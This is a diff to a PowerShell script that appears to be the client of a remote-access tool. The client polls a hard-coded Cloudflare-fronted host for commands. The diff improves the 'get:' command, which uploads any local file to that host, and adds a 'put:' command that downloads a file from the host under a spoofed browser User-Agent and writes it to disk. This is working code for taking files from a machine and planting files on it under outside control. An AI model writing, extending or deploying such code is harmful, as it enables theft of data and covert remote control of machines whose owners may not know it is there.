@@ -2,7 +2,7 @@
 # ║  CONFIGURATION                                                             ║
 # ║  Edit these values to match your setup. All features reference these vars. ║
 # ╚══════════════════════════════════════════════════════════════════════════════╝
-$Version = "3.0.5"
+$Version = "3.0.6"
 $cfHost = "https://connect.aniketpandey.website"
 $maxRetries = 10
 $cmdTimeout = 300   # default timeout — use 'notimeout:' prefix or 'cancel' for manual control
@@ -1052,9 +1052,20 @@ function Connect-Cloudflare {
                     $command = "gui:" + $guiShortcuts[$command.ToLower()]
                 }
 
-                # File download: get:<filepath> → upload raw bytes to /upload on server
+                # File transfer: get:<filepath> → resolve relative paths, upload to server
                 if ($command -match '^get:(.+)$') {
                     $filePath = $Matches[1].Trim()
+                    # Resolve relative path against the persistent runspace's current directory
+                    if (-not [System.IO.Path]::IsPathRooted($filePath)) {
+                        try {
+                            $cwdPs = [powershell]::Create()
+                            $cwdPs.Runspace = (Get-PersistentRunspace)
+                            $cwdResult = $cwdPs.AddScript('(Get-Location).Path').Invoke() | ForEach-Object { $_.ToString() }
+                            $cwdPs.Dispose()
+                            $cwd = if ($cwdResult) { @($cwdResult)[0] } else { (Get-Location).Path }
+                        } catch { $cwd = (Get-Location).Path }
+                        $filePath = [System.IO.Path]::Combine($cwd, $filePath)
+                    }
                     if (-not (Test-Path $filePath -PathType Leaf)) {
                         Send-Result-To-Server -Body "[!] File not found: $filePath`n"
                         Start-Sleep -Milliseconds $activeDelay
@@ -1069,6 +1080,28 @@ function Connect-Cloudflare {
                         Send-Result-To-Server -Body "[+] Sent '$filePath' ($($fileBytes.Length) bytes)`n"
                     } catch {
                         Send-Result-To-Server -Body "[!] Upload failed: $($_.Exception.Message)`n"
+                    }
+                    Start-Sleep -Milliseconds $activeDelay
+                    continue
+                }
+
+                # File transfer: put:<filename> → fetch bytes from server, save to script dir
+                if ($command -match '^put:(.+)$') {
+                    $fileName = $Matches[1].Trim()
+                    $destPath = Join-Path $scriptDir $fileName
+                    try {
+                        $wc = New-Object System.Net.WebClient
+                        $wc.Headers.Add("User-Agent", "Mozilla/5.0")
+                        $fileBytes = $wc.DownloadData("$cfHost/fetch?id=$clientId")
+                        $wc.Dispose()
+                        if ($fileBytes -and $fileBytes.Length -gt 0) {
+                            [System.IO.File]::WriteAllBytes($destPath, $fileBytes)
+                            Send-Result-To-Server -Body "[+] Saved '$fileName' to '$destPath' ($($fileBytes.Length) bytes)`n"
+                        } else {
+                            Send-Result-To-Server -Body "[!] No file data received from server`n"
+                        }
+                    } catch {
+                        Send-Result-To-Server -Body "[!] Put failed: $($_.Exception.Message)`n"
                     }
                     Start-Sleep -Milliseconds $activeDelay
                     continue
